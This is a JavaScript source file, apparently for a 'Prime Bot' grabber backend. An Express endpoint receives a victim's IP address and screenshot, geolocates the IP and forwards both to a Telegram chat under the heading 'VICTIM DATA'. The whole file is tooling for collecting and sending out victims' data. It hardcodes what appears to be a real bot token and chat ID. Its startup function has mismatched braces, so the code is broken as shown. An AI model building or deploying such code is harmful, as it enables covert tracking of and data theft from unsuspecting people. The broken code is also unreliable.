// ================ KONFIGURASI ================
const BOT_TOKEN = process.env.BOT_TOKEN || '7972346190:AAGgZqyiXZiadOFaKxilcerba0Wk87dvL5Q';
const CHAT_ID = process.env.CHAT_ID || '8388649100';
const API_KEY = process.env.API_KEY || 'prime2025';

// ================ SETUP ================
import { Telegraf } from 'telegraf';
import express from 'express';

const bot = new Telegraf(BOT_TOKEN);
const app = express();
app.use(express.json());

// ================ FUNGSI UTAMA ================
async function getIPInfo(ip) {
  try {
    // Ambil info IP dari API gratis
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();
    return `${data.city || 'Unknown'}, ${data.country || 'Unknown'}`;
  } catch {
    return 'Location Unknown';
  }
}

async function sendToTelegram(ip, screenshot = null) {
  try {
    const location = await getIPInfo(ip);
    const time = new Date().toLocaleString();
    
    const message = 
`‼️ VICTIM DATA ‼️
📍 IP : ${ip}
🌍 Location : ${location}
📸 Screenshot : ${screenshot ? 'YES' : 'NO'}
🕐 Time : ${time}
Support by : PRIME 😈`;

    // Kirim ke Telegram
    if (screenshot) {
      // Jika ada screenshot base64
      const buffer = Buffer.from(screenshot, 'base64');
      await bot.telegram.sendPhoto(CHAT_ID, 
        { source: buffer }, 
        { caption: message }
      );
    } else {
      await bot.telegram.sendMessage(CHAT_ID, message);
    }
    
    return { success: true };
  } catch (error) {
    console.log('Error send:', error.message);
    return { success: false, error: error.message };
  }
}

// ================ API ROUTE ================
app.post('/capture', async (req, res) => {
  try {
    // Cek API Key
    if (req.headers['x-api-key'] !== API_KEY) {
      return res.json({ status: 'error', msg: 'Invalid key' });
    }
    
    // Ambil data dari request
    const { ip, screenshot } = req.body;
    
    if (!ip) {
      return res.json({ status: 'error', msg: 'IP required' });
    }
    
    // Kirim ke Telegram
    const result = await sendToTelegram(ip, screenshot);
    
    res.json({
      status: result.success ? 'success' : 'error',
      msg: result.success ? 'Data sent to Telegram' : result.error
    });
    
  } catch (error) {
    res.json({ status: 'error', msg: error.message });
  }
});

// Health check
app.get('/', (req, res) => {
  res.json({ 
    status: 'online', 
    service: 'Prime Bot',
    endpoint: 'POST /capture',
    key: 'x-api-key: ' + API_KEY
  });
});

// ================ TELEGRAM COMMANDS ================
bot.command('start', (ctx) => {
  ctx.reply('🤖 Prime Bot Active\nUse /test to check');
});

bot.command('test', (ctx) => {
  ctx.reply('✅ Bot working!\nIP: 127.0.0.1\nTime: ' + new Date().toLocaleString());
});

// ================ START SERVER ================
async function start() {
  try {
    // Start bot
    await bot.launch();
    console.log('✅ Bot Telegram: ACTIVE');
    
    // Start server
    const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
      console.log(`📡 Endpoint: POST /capture`);
      console.log(`🔐 Key: ${API_KEY}`);
      console.log('📸 Support: IP + Screenshot (base64)');
    });
    
  } catch (error) {
    console.log('❌ Error:', error.message);
    process.exit(1);
  }
}

// ================ JALANKAN ================
start();
